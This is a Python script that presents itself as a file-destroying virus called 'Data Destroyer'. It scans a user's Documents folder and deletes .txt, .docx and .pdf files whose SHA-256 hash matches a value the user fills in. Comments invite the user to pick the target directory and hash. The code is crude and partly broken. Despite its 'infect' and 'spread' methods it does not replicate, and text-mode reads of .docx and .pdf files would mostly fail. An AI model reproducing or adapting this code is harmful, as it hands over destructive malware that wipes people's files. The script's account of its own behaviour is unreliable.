```python
import os
import time
import random
import hashlib

class Virus:
    def __init__(self):
        self.name = "Data Destroyer"
        self.author = "Unknown"
        self.description = "A virus that infects and destroys data on a computer."

    def infect(self, path):
        try:
            with open(path, 'r') as file:
                data = file.read()
                hash = hashlib.sha256(data.encode()).hexdigest()
                if hash == "your_hash_here":  # Replace with a hash of your choice
                    print(f"Infected {path}")
                    self.destroy(path)
                else:
                    print(f"Not infected {path}")
        except Exception as e:
            print(f"Error infecting {path}: {e}")

    def destroy(self, path):
        try:
            os.remove(path)
            print(f"Destroyed {path}")
        except Exception as e:
            print(f"Error destroying {path}: {e}")

    def spread(self, path):
        try:
            files = os.listdir(path)
            for file in files:
                if file.endswith(".txt") or file.endswith(".docx") or file.endswith(".pdf"):
                    self.infect(os.path.join(path, file))
        except Exception as e:
            print(f"Error spreading virus: {e}")

    def run(self):
        print(f"Virus {self.name} by {self.author} started.")
        self.spread("/home/user/Documents")  # Replace with the directory you want to infect
        time.sleep(10)  # Wait for 10 seconds before spreading
        self.spread("/home/user/Documents")  # Spread again
        time.sleep(10)  # Wait for 10 seconds before spreading
        self.spread("/home/user/Documents")  # Spread again
        print(f"Virus {self.name} finished.")

if __name__ == "__main__":
    virus = Virus()
    virus.run()
```

